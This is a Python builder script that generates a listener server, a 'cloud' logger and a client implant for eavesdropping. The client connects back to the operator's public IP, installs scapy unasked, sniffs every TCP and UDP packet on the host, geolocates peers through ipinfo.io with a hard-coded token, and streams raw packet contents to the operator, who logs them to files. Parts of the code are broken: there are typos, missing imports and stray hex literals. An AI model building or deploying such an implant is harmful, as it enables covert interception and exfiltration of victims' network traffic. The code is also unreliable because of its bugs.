import os
import argparse
import sys
def create_cloud(addr, port):
	print("[*] Writing . . . ")
	file_ = f'''import socket
import codecs
import argparse
import struct
# This is a cloud for Eavesdropping client
# Version 1.
#############
def listen(lhost, lport):
	note = open("note.dr", 'a')
	try:
		cl = socket.socket()
		cl.bind((lhost, lport))
	except Exception as e:
		print("[-] Cloud is not working. Reason: %s" % e)
		sys.exit(1)
	0x00
	0x00001
	0x12
	0xff
	0x0A
	0xff
	0x00
	0x00
	'''
	file_ += '''
	print(f"[*] Cloud is listening as {lhost}:{str(lport)}")
	cl.listen(5)
	client_, client_addr = cl.accept()
	print(f"[*] Client {client_addr[0]} connected with port {client_addr[0]}")
	while True:
		dat = client_.recv(14813).decode()
		#dat_ = "x = " + f'"{dat}"'
		#rock_ = exec(dat_)
		datable = dat.replace("'", '')
		datable = datable.replace("b", "")
		datable = datable.replace('"', "")
		datable = datable.replace("[*] DATA[UDP]:", '')
		datable = datable.replace("[*] DATA[TCP]:", '')
		datable = datable.replace("\\\\", "\\\\")
		datable = datable.replace("\\\'x'", '')
		datable = datable.replace("\\\\x2", '')
		datable = datable.replace("[*] DATA:", "")
		#print(datable)
		sr = f"{datable}"
		if '\\\\x' in sr:
			purpose = "Hex"
		else:
			purpose = "String"
		crawn = len(datable)
		binary = bin(crawn)
		print(f"[*] Handshake got! You can inspect it later .. . .  Length: {len(datable)} Type: {purpose} Binary: {binary}")
		#datable = datable.encode()
		note.write(datable + '\\n') 
		'''
	file_ += f'''
def __main__():
	lhost = '{addr}'
	lport = {port}
	listen(lhost, lport)
__main__()'''
	grawl = open("ecloud_.py", 'w')
	grawl.write(file_)
	grawl.close()
	print("[*] Writing to file had finished . . .")
	sys.exit(1)
def create_client(addr, port,c ):
	print("[*] Releasing client . . . .")
	file_ = f'''
import os
try:
	import scapy.all
	from scapy.all import * 
except:
	os.system("pip3 install scapy")
import socket
import os
import json
import platform
import requests
def __main__():
	try:
		rhost = '{addr}' # Your PUBLIC IP
		rport = {port} # Forwarded Port
		clport = {c}
		cl = socket.socket()
		sr = socket.socket()
		sr.connect((rhost, rport))
		cl.connect((rhost, clport))
	except:
		time.sleep(5)
	dr = sr.recv(14813).decode()
	if 'infome' in dr:
		op = requests.get("https://api64.ipify.org?format=json")
		js = json.loads(op.text)
		ip = js["ip"]
	'''
	file_ += '''
	sr.send(f"[*] IP: {ip}".encode())
	def sniffer(pkt):
		if pkt.haslayer(UDP):
			lipu = socket.gethostname()
			lipud = socket.gethostbyname(lipu)
			if lipud == pkt[IP].dst:
				try:
					j = requests.get(f"https://ipinfo.io/{pkt[IP].src}?token=9c7cf21e40bd6e")
					js = json.loads(j.text)
					city_2 = j["city"]
					country_2 = j["country"]
				except:
					city_2 = "Unknown"
					country_2 = "Unknown"
				sr.send(f"[SR1][UDP] {pkt[IP].src} =====> {lipud} Packets: {len(pkt[UDP])} Ports: {pkt.dport} | City: {city_2}  Country: {country_2}".encode())
				cl.send(f"[*] DATA[UDP]: ".encode() + str(pkt[UDP]).encode())
			if lipud == pkt[IP].src:
				try:
					j_ = requests.get(f"https://ipinfo.io/{pkt[IP].dst}?token=9c7cf21e40bd6e")
					js_ = json.loads(j_.text)
					cit_2 = js_["city"]
					con_2 = js_["country"]
				except:
					cit_2 = "Unknown"
					con_2 = "Unknown"
				sr.send(f"[SR2][UDP] {lipud} =====> {pkt[IP].dst} Packets: {len(pkt[UDP])} Ports: {pkt.dport} | City: {cit_2} Country: {con_2}".encode())
				cl.send(f"[*] DATA[UDP]: ".encode() + str(pkt[UDP]).encode())
		if pkt.haslayer(TCP):
			lip = socket.gethostname()
			lips = socket.gethostbyname(lip)
			if lips == pkt[IP].dst:
				try:
					req = requests.get(f"https://ipinfo.io/{pkt[IP].src}?token=9c7cf21e40bd6e")
					recv = json.loads(req.text)
					city = recv["city"]
					country = recv["country"]
				except:
					city = "Unknown"
					country = "Unknown"
				sr.send(f"[SR1][TCP] {pkt[IP].src} ======-> {lips}  Packets: {len(pkt[TCP])} Ports: {pkt.dport} | City: {city} Country: {country}".encode())
				cl.send(f"[*] DATA: ".encode() + str(pkt[TCP]).encode())
			if lips == pkt[IP].src:
				try:
					req_ = reuqests.get(f"https://ipinfo.io/{pkt[IP].dst}?token=9c7cf21e40bd6e")
					recv_ = json.loads(req_.text)
					cit = recv_["city"]
					con = recv_["country"]
				except:
					cit = "Unknown"
					con = "Unknown"
				sr.send(f"[SR2][TCP] {lips} =====-> {pkt[IP].dst} Packets: {len(pkt[TCP])} Ports: {pkt.dport} | City: {cit} Country: {con}".encode())
				cl.send(f"[*] DATA: ".encode() + str(pkt[TCP]).encode())
	sniff(prn=sniffer)
__main__()
'''
	cr = open("eclient_.py", 'w')
	cr.write(file_)
	cr.close()
	print("[*] Finished . .. ")
def create_server(addr, port):
	print("[*] Releasing server . . . .")
	file_ = '''import socket
import sys
import time
import argparse
import base64
def listen(addr, port):
	try:
		s = socket.socket()
		s.bind((addr, port))
	except Exception as f:
		print(f"[-] Couldn't bind {addr}:{str(lport)} Reason: {f}")
		sys.exit(5)
	traffic_utf = open("traffic.u", 'w')
	traffic = open("traffic.ass", 'a')
	print(f"[*] Listening as {addr}:{str(port)} . . . Type: server")
	s.listen(5)
	client, client_addr = s.accept()
	print(f"[*] Client {client_addr[0]} connected on port {client_addr[1]} . . .")
	client.send("infome".encode())
	info = client.recv(15813).decode()
	print(f"[*] Info about {client_addr[0]}")
	print(info)
	print(f"[*] Starting sniffer . . .")
	while True:
		data = client.recv(14813).decode()
		ds = data.encode()
		print("DATA: " + data + "\\x0A")
		bs = base64.b64encode(ds)
		primary = bs.decode()
		traffic.write(primary + "\\n")
		traffic_utf.write(data + "\\x0A")'''

	file_ += f'''
def __main__():
	addr = '{addr}'
	port = int({port})
	listen(addr, port)
__main__()'''
	cry = open("eserver_.py", 'w')
	cry.write(file_)
	cry.close()
	print("[*] File writing successful!")
	sys.exit(1)
def __main__():
	parsie = argparse.ArgumentParser()
	parsie.add_argument("-o", "--option", help="Type(s): server, client, cloud", required=True)
	parsie.add_argument("-p", "--port", help="Specify the default port", required=True)
	parsie.add_argument("-c", "--cloud", help="Specify the cloud port", default=0, required=False)
	parsie.add_argument("-a", "--address", help="Specify the address (PUBLIC IP) or for cloud and server local", required=True)
	args = parsie.parse_args()
	opt = args.option
	port = args.port 
	addr = args.address
	c = args.cloud
	if opt == 'server':
		create_server(addr, port)
	if opt == 'client':
		create_client(addr, port, c)
	if opt == 'cloud':
		create_cloud(addr, port)
__main__()